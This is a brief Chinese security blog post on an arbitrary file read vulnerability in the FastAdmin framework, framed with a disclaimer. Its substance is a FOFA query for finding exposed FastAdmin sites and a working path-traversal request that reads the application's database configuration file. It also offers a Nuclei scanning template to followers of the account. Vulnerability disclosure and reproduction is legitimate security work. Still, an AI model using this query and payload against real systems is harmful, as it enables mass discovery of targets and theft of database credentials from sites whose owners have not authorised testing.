#  Fastadmin 前台任意文件读取漏洞   
四月安全  四月安全   2024-06-19 23:17  
  
**0x0**  
  
免责声明  
  
**本文仅用于技术学习和讨论。请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。**  
  
**0x1**  
  
漏洞介绍  
  
FastAdmin是一个基于ThinkPHP5和Bootstrap的后台开发框架，支持权限管理、响应式开发、多语言、模块化开发、CRUD和自由可扩展等功能，前台存在任意文件读取漏洞  
  
**0x2**  
  
资产测绘  
```
fofa：body="fastadmin.net" || body="<h1>fastadmin</h1>" && title="fastadmin"
```  
  
**0x3**  
  
漏洞复现  
  
读取/application/database文件内容  
```
http://127.0.0.1/index/ajax/lang?lang=../../application/database
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLk7stTDCoTvHN4ib09thhUqXUS9g8GgLh13rJz6Fte511CBibUOcxSib8CDrPibkPTTzEMnn401F41QlVOibJSykaQ/640?wx_fmt=png&from=appmsg "")  
  
**0x4**  
  
Nuclei脚本  
  
关注公众号："  
四月安全" ，回复  "  
fastadmin-Filereading"  获取  
 Nuclei 脚本  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/iaLk7stTDCoTvHN4ib09thhUqXUS9g8GgL9QsOB7tK8SeAK4qGJt6DM6ubX3uOTrv5mtI885Yefa9aLlAjjia0Jng/640?wx_fmt=png&from=appmsg "")  
  
  
  
